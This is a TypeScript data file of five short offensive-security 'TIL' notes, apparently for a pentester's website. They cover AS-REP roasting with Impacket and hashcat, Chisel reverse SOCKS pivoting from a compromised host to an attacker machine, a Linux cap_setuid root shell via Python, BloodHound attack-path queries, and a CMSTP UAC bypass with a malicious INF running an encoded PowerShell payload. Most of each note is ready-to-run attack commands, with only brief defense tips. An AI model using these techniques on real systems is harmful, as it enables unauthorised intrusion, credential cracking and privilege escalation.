import { TilNote } from "@/types";

export const tilNotes: TilNote[] = [
  {
    id: "til-1",
    slug: "as-rep-roasting-without-preauth",
    title: "Kerberos AS-REP Roasting: Hunting Accounts Without Pre-Auth",
    category: "Active Directory",
    date: "2024-08-20",
    tags: ["Kerberos", "AS-REP", "Active Directory", "Impacket"],
    readTime: "2 min read",
    summary: "How to hunt for DONT_REQ_PREAUTH user accounts and request crackable Kerberos Ticket Granting Service (TGS/AS-REP) hashes without domain credentials.",
    content: `When Kerberos pre-authentication is disabled on an Active Directory account (\`DONT_REQ_PREAUTH\` flag in \`userAccountControl\`), any network user can request an AS-REP response containing encrypted timestamp data that can be cracked offline.

### 1. Impacket Enumeration (Unauthenticated or with Domain Account)

\`\`\`bash
# If you have an unauthenticated list of harvested usernames:
$ impacket-GetNPUsers domain.local/ -usersfile usernames.txt -format hashcat -outputfile asrep_hashes.txt

# If you have domain user credentials:
$ impacket-GetNPUsers domain.local/david.b:'Password123' -request -format hashcat -dc-ip 10.10.11.35
\`\`\`

### 2. Cracking with Hashcat

The hash format matches Hashcat mode **18200**:

\`\`\`bash
$ hashcat -m 18200 -a 0 asrep_hashes.txt /usr/share/wordlists/rockyou.txt -o cracked.txt
\`\`\`

> **Defense Tip:** Ensure \`Do not require Kerberos preauthentication\` is never checked in Active Directory Users & Computers unless legacy software strictly mandates it.
`,
  },
  {
    id: "til-2",
    slug: "chisel-reverse-socks-pivoting",
    title: "Chisel Reverse SOCKS5 Pivoting Master Syntax",
    category: "Tooling",
    date: "2024-07-15",
    tags: ["Pivoting", "SOCKS5", "Chisel", "Proxychains", "Networking"],
    readTime: "3 min read",
    summary: "Clean one-liner syntax for deploying Chisel reverse socks tunnels across firewalled dual-homed pivot hosts without opening inbound firewall ports.",
    content: `When compromising a dual-homed machine that has egress access to your Kali box but rejects inbound connections on secondary interfaces, use a **Reverse Chisel Tunnel**.

### Step 1: Start Chisel Server on Attacker (Kali)

\`\`\`bash
# Run server on port 8000 allowing reverse port forwards
$ ./chisel server --reverse --port 8000
\`\`\`

### Step 2: Connect from Compromised Host

\`\`\`bash
# Linux Target:
./chisel client 10.10.14.x:8000 R:1080:socks

# Windows Target (Powershell / CMD):
chisel.exe client 10.10.14.x:8000 R:1080:socks
\`\`\`

This binds SOCKS5 on **127.0.0.1:1080** on your Kali box!

### Step 3: Configure Proxychains

Add to \`/etc/proxychains4.conf\`:
\`\`\`conf
socks5 127.0.0.1 1080
\`\`\`

Now any command can pivot seamlessly into the internal subnet:
\`\`\`bash
$ proxychains4 nmap -sT -Pn -p 445,3389,80 172.16.10.0/24
\`\`\`
`,
  },
  {
    id: "til-3",
    slug: "linux-capabilities-cap-setuid",
    title: "Privilege Escalation via cap_setuid+ep on Linux Binaries",
    category: "Privilege Escalation",
    date: "2024-06-02",
    tags: ["Linux", "Privesc", "Capabilities", "Setuid"],
    readTime: "2 min read",
    summary: "Exploiting misconfigured Linux POSIX capabilities such as cap_setuid to bypass SUID binary restrictions and gain instant root.",
    content: `Linux capabilities divide root privileges into distinct units. If a binary has \`cap_setuid+ep\`, it can alter its UID to 0 without possessing the traditional SUID permission bit.

### Enumeration

\`\`\`bash
$ getcap -r / 2>/dev/null
/usr/bin/python3.10 = cap_setuid+ep
/usr/bin/tar = cap_dac_read_search+ep
\`\`\`

### Exploitation via Python

Because \`cap_setuid\` is enabled, Python can invoke \`os.setuid(0)\`:

\`\`\`bash
$ /usr/bin/python3.10 -c 'import os; os.setuid(0); os.system("/bin/bash")'
root@target:~# id
uid=0(root) gid=1000(user) groups=1000(user)
\`\`\`

> **Note:** Always inspect capabilities when LinPEAS or manual enumeration shows no standard SUID binaries!
`,
  },
  {
    id: "til-4",
    slug: "bloodhound-cypher-queries-quickref",
    title: "Essential BloodHound Cypher Queries for Active Directory Audits",
    category: "Active Directory",
    date: "2024-05-11",
    tags: ["BloodHound", "Cypher", "Active Directory", "Neo4j"],
    readTime: "3 min read",
    summary: "Handy custom Cypher queries for Neo4j/BloodHound to reveal hidden shadow admins, GenericAll loops, and Kerberoastable high-privilege accounts.",
    content: `BloodHound's default queries only scratch the surface. Here are high-yield custom Cypher queries to paste into the Raw Query bar:

### 1. Find Kerberoastable Users with Path to Domain Admins

\`\`\`cypher
MATCH (u:User {hasspn:true})
MATCH (g:Group {name:'DOMAIN ADMINS@DOMAIN.LOCAL'})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN p
\`\`\`

### 2. Find Non-Standard Users with DCSync Rights

\`\`\`cypher
MATCH (n)-[r:GetChangesAll]->(d:Domain)
WHERE NOT n.name STARTS WITH 'KRBTGT'
RETURN n.name, type(r)
\`\`\`

### 3. Find Shortest Path from Owned Principals to Tier-0

\`\`\`cypher
MATCH (u:User {owned:true})
MATCH (g:Group {admincount:true})
MATCH p=shortestPath((u)-[*1..]->(g))
RETURN p
\`\`\`
`,
  },
  {
    id: "til-5",
    slug: "uac-bypass-cmstp-inf",
    title: "Bypassing Windows UAC via CMSTP and Malicious INF Scriptlets",
    category: "Privilege Escalation",
    date: "2024-04-18",
    tags: ["Windows", "UAC Bypass", "CMSTP", "Red Team"],
    readTime: "3 min read",
    summary: "Leveraging the built-in Microsoft Connection Manager Profile Installer (cmstp.exe) to silently execute high-integrity processes from a medium-integrity context.",
    content: `\`cmstp.exe\` is an auto-elevating binary in \`C:\\Windows\\System32\\\`. By supplying a crafted \`.inf\` configuration containing a scriptlet launcher, code execution runs with high integrity without tripping standard UAC prompts.

### Malicious INF Template (\`bypass.inf\`)

\`\`\`ini
[Version]
Signature=$chicago$
AdvancedINF=2.5

[DefaultInstall]
CustomDestination=CustInstDestSectionAllUsers
RunPreSetupCommands=RunPreSetupCommandsSection

[RunPreSetupCommandsSection]
; Payload command runs elevated!
cmd.exe /c powershell -enc <Base64Payload>

[CustInstDestSectionAllUsers]
49000,49001=AllUSer_Folder,1

[AllUSer_Folder]
HKLM, "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\App Paths\\\\cmd.exe", "", 0, "cmd.exe"
\`\`\`

### Triggering the Execution

\`\`\`cmd
cmstp.exe /au bypass.inf
\`\`\`

> Automatically elevated shell spawned with \`High\` mandatory integrity level.
`,
  }
];
